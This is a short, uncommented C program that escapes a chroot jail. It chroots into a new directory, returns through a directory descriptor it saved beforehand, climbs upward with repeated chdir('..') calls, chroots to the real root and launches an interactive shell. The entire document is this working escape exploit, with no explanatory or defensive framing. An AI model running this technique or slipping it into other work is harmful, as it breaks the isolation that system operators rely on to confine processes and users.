#include <unistd.h>

main () {
    int dir_fd,x;
    mkdir("/tmp/blah",0755);
    dir_fd=open(".");
    chroot("/tmp/blah");
    fchdir(dir_fd);
    for(x=0;x<99;x++)
    {
        chdir("..");
    }
    chroot(".");
    execl("/bin/sh","-i",NULL);
}
